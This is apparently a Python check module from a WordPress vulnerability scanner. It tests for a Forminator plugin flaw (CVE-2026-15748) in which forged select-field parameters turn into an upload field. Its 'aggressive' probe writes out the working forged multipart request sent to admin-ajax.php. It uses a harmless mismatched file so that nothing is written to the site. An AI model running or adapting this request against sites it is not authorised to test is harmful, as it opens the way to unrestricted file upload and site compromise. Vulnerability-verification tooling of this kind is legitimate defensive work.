from __future__ import annotations

import json
import re
from typing import Any

from ...core.http import HttpSession, is_transport_error, normalize_url, transport_error_detail
from ...core.models import Finding
from ...core.probes import rand_str
from .forminator_advisory import COMPONENT, discover_forms, passive_result

CVE_ID = "CVE-2026-15748"
NAME = "Forminator select-field injection to unrestricted file upload"
AFFECTED_RULE = "Forminator 1.18.1-1.56.1; fixed in 1.56.2"
HAS_EXPLOIT = True
INTRUSIVE = True
EXPLOIT_MODES = ["safe", "aggressive"]
# Text content served with a mismatched image filename. The genuine upload
# field rejects it and the forged record fails closed the same way, so the
# probe writes no files on either branch; only the error routing differs.
MISMATCH_NAME = "proofcms-15748-err.jpg"
MISMATCH_TYPE = "image/jpeg"
MISMATCH_BODY = b"this is plain text, not a jpeg"
GENUINE_NAME = "proofcms-15748-genuine.jpg"
GENUINE_JPEG = bytes.fromhex("ffd8ffe000104a46494600010101006000600000") + b"0" * 64


def classify_version(version: str | None) -> str:
    from .forminator_advisory import classify_version as classify

    return classify(version, minimum="1.18.1", fixed="1.56.2")


def run_safe_probe(target_url: str, timeout: int = 12, proxy: str | None = None) -> Finding:
    forms = [form for form in discover_forms(target_url, timeout, proxy) if form["has_upload"] and form["has_select"]]
    if not forms:
        return Finding(cve=CVE_ID, name=NAME, status="NOT_CONFIRMED", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, detail="No public Forminator form containing both a file-upload field and a select field was found.", action="Upgrade Forminator to 1.56.2 or newer and review private forms for this field combination.")
    return Finding(cve=CVE_ID, name=NAME, status="NOT_CONFIRMED", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, detail="A public form has the vulnerable field combination, but no file was uploaded and no server-side mutation was attempted by the safe probe.", action="Upgrade Forminator to 1.56.2 or newer; validate with an authenticated staging-only test if proof is required.")


def _parse_form_page(html: str) -> dict[str, Any]:
    """Extract form IDs, nonce, upload/select inputs, and auto-fill values."""
    form_ids = [fid for fid in re.findall(r'name="form_id" value="(\d+)"', html)]
    form_ids += [fid for fid in re.findall(r'data-form-id="(\d+)"', html) if fid not in form_ids]
    nonce = next(
        (m.group(1) for m in re.finditer(r'name="forminator_nonce" value="([^"]+)"', html) if m.group(1)),
        None,
    )
    uploads = re.findall(r'<input[^>]*type="file"[^>]*name="([^"]+)"', html, re.IGNORECASE)
    uploads += [n for n in re.findall(r'name="([^"]+)"[^>]*type="file"', html, re.IGNORECASE) if n not in uploads]
    selects: dict[str, list[str]] = {}
    for m in re.finditer(r'<select[^>]*name="([^"]+)"[^>]*>(.*?)</select>', html, re.IGNORECASE | re.DOTALL):
        options = [o for o in re.findall(r'<option[^>]*value="([^"]*)"', m.group(2), re.IGNORECASE) if o]
        selects[m.group(1)] = options
    fill: dict[str, str] = {}
    for m in re.finditer(r"<input\b[^>]*>", html, re.IGNORECASE):
        tag = m.group(0)
        name_m = re.search(r'name="([^"]+)"', tag, re.IGNORECASE)
        if not name_m:
            continue
        name = name_m.group(1)
        if name in uploads or name in selects:
            continue
        type_m = re.search(r'type="([^"]*)"', tag, re.IGNORECASE)
        itype = (type_m.group(1) if type_m else "text").lower()
        if itype in {"file", "hidden", "submit", "button", "image"}:
            continue
        if name in fill or name.startswith(("forminator", "form-id", "page-id", "render", "action")):
            continue
        if itype == "email" or "email" in name:
            fill[name] = f"proofcms{rand_str(6)}@example.invalid"
        elif itype in {"checkbox", "radio"}:
            value_m = re.search(r'value="([^"]*)"', tag, re.IGNORECASE)
            if value_m and value_m.group(1):
                fill[name] = value_m.group(1)
        elif itype == "number":
            fill[name] = "42"
        else:
            fill[name] = f"proofcms{rand_str(6)}"
    for name, options in selects.items():
        if name not in fill and options:
            fill[name] = options[0]
    for m in re.finditer(r'<textarea[^>]*name="([^"]+)"', html, re.IGNORECASE):
        fill.setdefault(m.group(1), f"proofcms{rand_str(6)} note")
    return {"form_ids": form_ids, "nonce": nonce, "uploads": uploads, "selects": selects, "fill": fill}


def _json(response: dict[str, Any]) -> dict[str, Any]:
    try:
        value = json.loads(str(response.get("body", "")))
    except (json.JSONDecodeError, TypeError):
        return {}
    return value if isinstance(value, dict) else {}


def _field_error(payload: dict[str, Any], field: str) -> str | None:
    """Return the first validation message keyed to the given field, if any."""
    data = payload.get("data")
    if not isinstance(data, dict):
        return None
    errors = data.get("errors")
    if isinstance(errors, list):
        for item in errors:
            if isinstance(item, dict) and field in item and item[field]:
                return str(item[field])[:300]
    if isinstance(errors, dict) and errors.get(field):
        return str(errors[field])[:300]
    return None


def run_aggressive_probe(
    target_url: str,
    timeout: int = 12,
    proxy: str | None = None,
    form_url: str | None = None,
) -> Finding:
    base = normalize_url(target_url)
    sess = HttpSession(base, timeout=timeout, proxy=proxy)
    candidates = [form_url] if form_url else []
    if not candidates:
        candidates = [form["page_url"] for form in discover_forms(target_url, timeout, proxy) if form["has_upload"] and form["has_select"]]
    parsed: dict[str, Any] | None = None
    page_url = ""
    for candidate in candidates:
        response = sess.get(candidate, timeout=timeout)
        if is_transport_error(response) or response.get("status") != 200:
            continue
        parsed = _parse_form_page(str(response.get("body", "")))
        if parsed["form_ids"] and parsed["uploads"] and parsed["selects"]:
            page_url = candidate
            break
        parsed = None
    if not parsed:
        return Finding(cve=CVE_ID, name=NAME, status="NOT_CONFIRMED", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, detail="No public Forminator form with a file-upload field, a select field, and a discoverable form ID was found.", action="Upgrade Forminator to 1.56.2 or newer and review private forms for this field combination.")
    form_id = next((fid for fid in parsed["form_ids"] if fid not in ("", "0")), None)
    if not form_id:
        return Finding(cve=CVE_ID, name=NAME, status="NOT_CONFIRMED", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, detail="A candidate form page was found, but no usable numeric form ID could be parsed.", action="Upgrade Forminator to 1.56.2 or newer.")
    genuine = parsed["uploads"][0]
    carrier = next(iter(parsed["selects"]))
    forge = f"proofcms{rand_str(8)}"

    def submit(fields: dict[str, Any], files: dict[str, Any]) -> tuple[dict[str, Any], dict[str, Any]]:
        data: dict[str, Any] = {
            "action": "forminator_submit_form_custom-forms",
            "form_id": form_id,
            "page_id": "0",
            "current_url": page_url,
            "form_type": "cform",
            "render_id": "0",
        }
        if parsed["nonce"]:
            data["forminator_nonce"] = parsed["nonce"]
        data.update(fields)
        response = sess.post_multipart("/wp-admin/admin-ajax.php", fields=data, files=files, timeout=timeout)
        return response, _json(response)

    baseline_resp, baseline_json = submit(
        dict(parsed["fill"]),
        {genuine: (f"proofcms-15748-base-{rand_str(6)}.jpg", MISMATCH_BODY, MISMATCH_TYPE)},
    )
    if is_transport_error(baseline_resp):
        return Finding(cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, detail=f"The baseline upload could not obtain an HTTP response ({transport_error_detail(baseline_resp)}).", action="Retry when the target is reachable; do not interpret transport failure as patch status.")
    baseline_error = _field_error(baseline_json, genuine)

    forged_fields = dict(parsed["fill"])
    forged_fields.pop(carrier, None)
    forged_fields.update(
        {
            f"{carrier}[return]": "1",
            f"{carrier}[name]": forge,
            f"{carrier}[field_type]": "upload",
            f"{carrier}[field_array][element_id]": forge,
            f"{carrier}[field_array][file-type]": "single",
            f"{carrier}[field_array][upload-method]": "single",
            f"{carrier}[field_array][custom-files]": "1",
            f"{carrier}[field_array][filetypes][]": "jpg",
            f"{carrier}[field_array][additional-type]": "jpg|image/jpeg",
            genuine: "__placeholder__",
        }
    )
    forged_resp, forged_json = submit(
        forged_fields,
        {
            forge: (f"proofcms-15748-{rand_str(6)}.jpg", MISMATCH_BODY, MISMATCH_TYPE),
            genuine: (f"proofcms-15748-genuine-{rand_str(6)}.jpg", MISMATCH_BODY, MISMATCH_TYPE),
        },
    )
    if is_transport_error(forged_resp):
        return Finding(cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, detail=f"The forged upload could not obtain an HTTP response ({transport_error_detail(forged_resp)}).", action="Retry when the target is reachable; do not interpret transport failure as patch status.")
    forged_error = _field_error(forged_json, forge)
    evidence: dict[str, Any] = {
        "form_id": form_id,
        "page_url": page_url,
        "genuine_field": genuine,
        "carrier_field": carrier,
        "forge_field": forge,
        "baseline_error": baseline_error,
        "forged_error": forged_error,
        "files_written": False,
    }
    if baseline_error and forged_error:
        return Finding(cve=CVE_ID, name=NAME, status="VULNERABLE", confidence="CONFIRMED", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, detail="The genuine upload field rejected the text-content file, and the identical file sent through a forged select-carried upload configuration was validated (and rejected) as an upload field instead of being ignored. Only the trusted forged path reaches the upload validator, which confirms the select-field injection. The mismatched content fails closed before any file is written, so the lab stays clean.", action="Upgrade Forminator to 1.56.2 or newer.", evidence=evidence)
    return Finding(cve=CVE_ID, name=NAME, status="NOT_CONFIRMED", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, detail=f"The forged upload configuration was not validated as an upload field (baseline error: {bool(baseline_error)}, forged error: {bool(forged_error)}). The target is likely patched.", action="Upgrade Forminator to 1.56.2 or newer.", evidence=evidence)


def check(target_url: str, cms_version: str | None = None, run_exploit_check: bool = False, timeout: int = 12, proxy: str | None = None, exploit_mode: str = "safe", aggressive_command: str | None = None, plugins: dict[str, Any] | None = None, **kwargs: Any):
    passive = passive_result(cve=CVE_ID, name=NAME, affected_rule=AFFECTED_RULE, plugins=plugins, fixed="1.56.2", minimum="1.18.1", remediation="Upgrade Forminator to 1.56.2 or newer.")
    if not run_exploit_check or passive.status not in {"LIKELY_VULNERABLE", "DETECTED_VERSION_UNKNOWN"}:
        return passive
    if exploit_mode == "aggressive":
        result = run_aggressive_probe(target_url, timeout=timeout, proxy=proxy, form_url=aggressive_command)
        result.component_version = passive.component_version
        return result
    result = run_safe_probe(target_url, timeout, proxy)
    result.component_version = passive.component_version
    return result


def metadata() -> dict[str, Any]:
    return {"cve": CVE_ID, "cms": "wordpress", "name": NAME, "component": COMPONENT, "affected_rule": AFFECTED_RULE, "affected_versions": ["1.18.1-1.56.1"], "exploit_available": True, "exploit_modes": EXPLOIT_MODES, "intrusive": INTRUSIVE, "module_version": "1.1.0", "last_reviewed": "2026-11-09", "updated": "2026-11-09", "required_detectors": ["detect_wordpress_plugins"], "references": ["https://github.com/ubaydev/CVE-2026-15748", "https://aretiq.ai/research/vul260818-cve-2026-15748-wpmu-dev-forminator-forms-select-field-injection-unrestricted-file-upload/", "https://mcpsec.dev/forminator-security/"]}
